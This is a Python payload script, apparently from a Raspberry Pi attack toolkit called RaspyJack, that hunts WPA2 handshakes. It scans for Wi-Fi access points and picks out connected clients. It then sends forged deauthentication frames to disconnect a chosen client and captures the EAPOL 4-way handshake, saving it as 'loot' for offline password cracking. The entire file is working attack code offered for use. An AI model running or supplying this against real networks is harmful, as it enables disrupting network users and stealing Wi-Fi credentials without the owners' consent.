#!/usr/bin/env python3
"""
RaspyJack Payload -- WPA2 Handshake Hunter
===========================================
Author: 7h30th3r0n3

Captures WPA2 4-way handshakes by scanning for APs, selecting a target,
discovering connected clients, sending targeted deauth, and capturing
the EAPOL exchange.  Saves as pcap file.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- pip install scapy (or apt install python3-scapy)
- apt install aircrack-ng

Controls:
  OK         -- Select AP / client
  UP / DOWN  -- Scroll list
  KEY1       -- Scan for APs
  KEY2       -- Export pcap to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/Handshakes/hs_YYYYMMDD_HHMMSS.pcap
"""

import os
import sys
import time
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeResp,
        RadioTap, EAPOL, sendp, sniff as scapy_sniff,
        wrpcap, raw, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/Handshakes"
CHANNELS_24 = list(range(1, 14))

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []         # [{bssid, essid, channel, signal}]
client_list = []     # [{mac, bssid}]
eapol_pkts = []      # raw captured EAPOL packets
handshake_count = 0
scroll = 0
selected_idx = 0
phase = "idle"       # idle | scanning | ap_select | client_scan | client_select | attacking | done
status_msg = ""
mon_iface = None
_running = True
_target_ap = None


# ---------------------------------------------------------------------------
# Onboard WiFi detection
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find a USB WiFi dongle suitable for monitor mode."""
    candidates = []
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo":
                continue
            if os.path.isdir(f"/sys/class/net/{name}/wireless"):
                if not _is_onboard_wifi_iface(name):
                    candidates.append(name)
    except Exception:
        pass
    no_mon = {"brcmfmac", "b43", "wl"}
    good, fallback = [], []
    for iface in candidates:
        drv = ""
        try:
            drv = os.path.basename(
                os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        except Exception:
            pass
        (fallback if drv in no_mon else good).append(iface)
    return (good or fallback or [None])[0]


def _monitor_up(iface):
    """Put iface into monitor mode. Returns monitor interface name or None."""
    for cmd in [
        ["nmcli", "device", "set", iface, "managed", "no"],
        ["sudo", "pkill", "-f", f"wpa_supplicant.*{iface}"],
        ["sudo", "pkill", "-f", f"dhcpcd.*{iface}"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass
    time.sleep(0.5)
    try:
        subprocess.run(["sudo", "airmon-ng", "start", iface],
                       capture_output=True, timeout=30)
        for name in (f"{iface}mon", iface):
            r = subprocess.run(["iwconfig", name],
                               capture_output=True, text=True, timeout=5)
            if "Mode:Monitor" in r.stdout:
                return name
    except Exception:
        pass
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       check=True, timeout=10)
        subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"],
                       check=True, timeout=10)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       check=True, timeout=10)
        time.sleep(0.5)
        r = subprocess.run(["iwconfig", iface],
                           capture_output=True, text=True, timeout=5)
        if "Mode:Monitor" in r.stdout:
            return iface
    except Exception:
        pass
    return None


def _monitor_down(iface):
    """Restore interface to managed mode."""
    if not iface:
        return
    base = iface.replace("mon", "")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", iface],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
        ["nmcli", "device", "set", base, "managed", "yes"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass


def _set_channel(iface, ch):
    """Set monitor interface to a specific channel."""
    try:
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                       capture_output=True, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Scan APs thread
# ---------------------------------------------------------------------------

def _scan_ap_thread(iface):
    """Scan all 2.4 GHz channels for APs."""
    global phase, status_msg
    found = {}

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if not bssid:
                return
            bssid = bssid.upper()
            try:
                essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            except Exception:
                essid = "<hidden>"
            if not essid:
                essid = "<hidden>"
            sig = getattr(pkt, "dBm_AntSignal", -99)
            if bssid not in found:
                found[bssid] = {"bssid": bssid, "essid": essid,
                                "channel": 0, "signal": sig}

    for ch in CHANNELS_24:
        if not _running:
            break
        _set_channel(iface, ch)
        with lock:
            status_msg = f"Scanning ch {ch}/13..."
        try:
            scapy_sniff(iface=iface, prn=_handle, timeout=1.5, store=False)
        except Exception:
            pass
        for e in found.values():
            if e["channel"] == 0:
                e["channel"] = ch

    with lock:
        ap_list.clear()
        ap_list.extend(sorted(found.values(),
                              key=lambda a: a.get("signal", -99), reverse=True))
        phase = "ap_select" if ap_list else "idle"
        status_msg = f"Found {len(ap_list)} APs" if ap_list else "No APs found"


# ---------------------------------------------------------------------------
# Scan clients thread
# ---------------------------------------------------------------------------

def _scan_clients_thread(iface, target_bssid, target_ch):
    """Discover clients associated with target AP."""
    global phase, status_msg
    found = set()

    _set_channel(iface, target_ch)

    def _handle(pkt):
        if not _running or not pkt.haslayer(Dot11):
            return
        ds = pkt[Dot11].FCfield & 0x3
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1
        bss = pkt[Dot11].addr3
        if not src or not dst:
            return
        src, dst = src.upper(), dst.upper()
        bss_up = (bss or "").upper()
        tbss = target_bssid.upper()
        # Client sending to AP
        if bss_up == tbss and src != tbss and src != "FF:FF:FF:FF:FF:FF":
            found.add(src)
        # AP sending to client
        if bss_up == tbss and dst != tbss and dst != "FF:FF:FF:FF:FF:FF":
            found.add(dst)

    with lock:
        status_msg = "Sniffing clients..."

    try:
        scapy_sniff(iface=iface, prn=_handle, timeout=10, store=False)
    except Exception:
        pass

    with lock:
        client_list.clear()
        client_list.extend([{"mac": m, "bssid": target_bssid} for m in found])
        if client_list:
            phase = "client_select"
            status_msg = f"Found {len(client_list)} clients"
        else:
            phase = "ap_select"
            status_msg = "No clients found"


# ---------------------------------------------------------------------------
# Deauth + Capture thread
# ---------------------------------------------------------------------------

def _attack_thread(iface, target_bssid, client_mac, target_ch):
    """Send deauth to client and capture EAPOL 4-way handshake."""
    global phase, status_msg, handshake_count
    _set_channel(iface, target_ch)

    eapol_msgs = {}  # key -> list of EAPOL packets

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(EAPOL):
            eapol_pkts.append(pkt)
            src = (pkt[Dot11].addr2 or "").upper() if pkt.haslayer(Dot11) else ""
            dst = (pkt[Dot11].addr1 or "").upper() if pkt.haslayer(Dot11) else ""
            pair_key = tuple(sorted([src, dst]))
            if pair_key not in eapol_msgs:
                eapol_msgs[pair_key] = []
            eapol_msgs[pair_key].append(pkt)

    stop_event = threading.Event()

    def _sniff_worker():
        try:
            scapy_sniff(iface=iface, prn=_handle, timeout=30, store=False,
                        stop_filter=lambda _: stop_event.is_set() or not _running)
        except Exception:
            pass

    sniff_t = threading.Thread(target=_sniff_worker, daemon=True)
    sniff_t.start()
    time.sleep(1)

    with lock:
        status_msg = "Sending deauth..."

    # Targeted deauth: client -> AP and AP -> client
    deauth1 = (RadioTap()
               / Dot11(addr1=client_mac, addr2=target_bssid,
                       addr3=target_bssid, type=0, subtype=12)
               / Dot11Deauth(reason=7))
    deauth2 = (RadioTap()
               / Dot11(addr1=target_bssid, addr2=client_mac,
                       addr3=target_bssid, type=0, subtype=12)
               / Dot11Deauth(reason=7))

    for burst in range(3):
        if not _running:
            break
        try:
            sendp(deauth1, iface=iface, count=5, inter=0.05, verbose=False)
            sendp(deauth2, iface=iface, count=5, inter=0.05, verbose=False)
        except Exception:
            pass
        with lock:
            status_msg = f"Deauth burst {burst + 1}/3, waiting..."
        time.sleep(3)

    with lock:
        status_msg = "Waiting for handshake..."

    deadline = time.time() + 15
    while time.time() < deadline and _running:
        for pair, msgs in eapol_msgs.items():
            if len(msgs) >= 4:
                stop_event.set()
                break
        if stop_event.is_set():
            break
        time.sleep(0.5)

    stop_event.set()
    sniff_t.join(timeout=3)

    # Count complete handshakes (4+ EAPOL messages for any pair)
    hs_count = sum(1 for msgs in eapol_msgs.values() if len(msgs) >= 4)

    with lock:
        handshake_count = hs_count
        if hs_count > 0:
            status_msg = f"Captured {hs_count} handshake(s)!"
            phase = "done"
        else:
            total_eapol = sum(len(m) for m in eapol_msgs.values())
            status_msg = f"No full HS ({total_eapol} EAPOL)"
            phase = "client_select"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write captured EAPOL packets as pcap."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"hs_{ts}.pcap")
    with lock:
        pkts = list(eapol_pkts)
    if pkts:
        wrpcap(filepath, pkts)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "HANDSHAKE HUNTER", font=font, fill="#FF0044")
    active = phase in ("scanning", "client_scan", "attacking")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#444")

    with lock:
        msg = status_msg
        aps = list(ap_list)
        clients = list(client_list)
        cur_phase = phase
        hs = handshake_count

    d.text((2, 16), msg[:24], font=font, fill="#AAAAAA")

    if cur_phase in ("ap_select",):
        visible = aps[scroll:scroll + ROWS_VISIBLE]
        for i, ap in enumerate(visible):
            y = 30 + i * ROW_H
            idx = scroll + i
            prefix = ">" if idx == selected_idx else " "
            line = f"{prefix}{ap['essid'][:14]}"
            color = "#00FF00" if idx == selected_idx else "#CCCCCC"
            d.text((2, y), line, font=font, fill=color)
            d.text((100, y), f"ch{ap['channel']}", font=font, fill="#666")

    elif cur_phase in ("client_select",):
        d.text((2, 28), f"Clients: {len(clients)}", font=font, fill="#888")
        visible = clients[scroll:scroll + ROWS_VISIBLE]
        for i, cl in enumerate(visible):
            y = 40 + i * ROW_H
            idx = scroll + i
            prefix = ">" if idx == selected_idx else " "
            mac_short = cl["mac"][-11:]
            color = "#00FF00" if idx == selected_idx else "#CCCCCC"
            d.text((2, y), f"{prefix}{mac_short}", font=font, fill=color)

    elif cur_phase == "attacking":
        d.text((2, 50), "Deauth + Capture", font=font, fill="#FFAA00")

    elif cur_phase == "done":
        d.text((2, 40), f"Handshakes: {hs}", font=font, fill="#00FF00")
        with lock:
            ep = len(eapol_pkts)
        d.text((2, 55), f"EAPOL pkts: {ep}", font=font, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    if cur_phase == "ap_select":
        d.text((2, 117), "OK:Sel K1:Scan K3:Quit", font=font, fill="#888")
    elif cur_phase == "client_select":
        d.text((2, 117), "OK:Deauth K1:Scan K3:Q", font=font, fill="#888")
    elif cur_phase == "done":
        d.text((2, 117), "K2:Export K1:Scan K3:Q", font=font, fill="#888")
    else:
        d.text((2, 117), "K1:Scan K3:Exit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll, selected_idx, status_msg, mon_iface
    global _target_ap

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    usb_iface = _find_usb_wifi()
    if not usb_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "No USB WiFi dongle", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    mon_iface = _monitor_up(usb_iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    status_msg = "Ready. KEY1 to scan."

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and phase not in ("scanning", "attacking", "client_scan"):
                phase = "scanning"
                scroll = 0
                selected_idx = 0
                threading.Thread(target=_scan_ap_thread, args=(mon_iface,),
                                 daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and phase == "ap_select":
                with lock:
                    if 0 <= selected_idx < len(ap_list):
                        _target_ap = dict(ap_list[selected_idx])
                if _target_ap:
                    phase = "client_scan"
                    scroll = 0
                    selected_idx = 0
                    threading.Thread(
                        target=_scan_clients_thread,
                        args=(mon_iface, _target_ap["bssid"],
                              _target_ap["channel"]),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and phase == "client_select":
                with lock:
                    if 0 <= selected_idx < len(client_list):
                        target_client = dict(client_list[selected_idx])
                if target_client and _target_ap:
                    phase = "attacking"
                    threading.Thread(
                        target=_attack_thread,
                        args=(mon_iface, _target_ap["bssid"],
                              target_client["mac"], _target_ap["channel"]),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    has_data = len(eapol_pkts) > 0
                if has_data:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:20]}"
                else:
                    with lock:
                        status_msg = "No data to export"
                time.sleep(0.3)

            elif btn == "UP":
                selected_idx = max(0, selected_idx - 1)
                if selected_idx < scroll:
                    scroll = selected_idx
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    if phase == "ap_select":
                        total = len(ap_list)
                    elif phase == "client_select":
                        total = len(client_list)
                    else:
                        total = 0
                selected_idx = min(selected_idx + 1, max(0, total - 1))
                if selected_idx >= scroll + ROWS_VISIBLE:
                    scroll = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        _monitor_down(mon_iface)
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
